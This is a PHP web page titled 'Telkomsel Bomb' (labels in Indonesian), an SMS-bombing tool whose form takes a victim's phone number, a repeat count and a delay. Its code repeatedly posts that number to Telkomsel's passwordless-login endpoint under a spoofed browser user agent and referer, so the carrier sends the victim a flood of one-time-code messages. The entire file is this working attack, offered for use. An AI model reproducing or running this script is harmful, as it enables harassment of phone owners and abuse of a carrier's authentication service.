<?php

error_reporting(0);

$delay = trim($_POST["delay"]);
$jumlah = trim($_POST["jumlah"]);
$nope = trim($_POST["nope"]);
$submit = $_POST["submit"];

function telkbomb($no, $jum, $wait){
	    $x = 0; 
	    while($x < $jum) {
	        $ch = curl_init();
	        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
	        curl_setopt($ch, CURLOPT_POST, 1);
	        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
	        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
	        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
	        $server_output = curl_exec ($ch);
	        curl_close ($ch);
	        echo $server_output."<br>";
	        sleep($wait);
	        $x++;
	        flush();
	    }
	}

if(isset($submit)){
	telkbomb($nope,$jumlah,$delay);
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Telkomsel bomb</title>

	<style type="text/css">
		
		body{
			margin: 0;
			padding: 0;
			font-family: Arial,helvetica,sans-serif;
			background-color:pink;
		}

		.container{
			left: 50%;
			top: 50%;
			transform: translate(-50%,-50%);
			overflow: hidden;
			position: absolute;
			background-color:green;
		}

		h1{
			text-align: center;
			background-color:red;
		}

		input{
			display: block;
			padding: 10px 30px;
			margin-top: 5px;
		}

		span{
			display: inline-block;
			margin: 10px 0;
		}

		input[type="text"]{
			width: 340px;
			border: #000 solid 1px; 
			outline: none;
			border-radius: 5px;
		}

		input[type="submit"]{
			width: 150px;
			border: #000 solid 1px; 
			outline: none;
			border-radius: 5px;
			background-color: #fff;
			cursor: pointer;

		}

		textarea{
			position: relative;
			width: 500px;
			height: 150px;
		}
	</style>
</head>
<body>

<div class="container">

<h1>Telkomsel Bomb</h1>
<form method="POST" action="">
<span>No handphone :</span>
<input type="text" name="nope" placeholder="0823XXXXXXXXX">
<span>Jumlah :</span>
<input type="text" name="jumlah" placeholder="0-999999">
<span>Delay (detik) :</span>
<input type="text" name="delay" placeholder="0-99999">
<input type="submit" name="submit">
</form>
</div>
</body>
</html>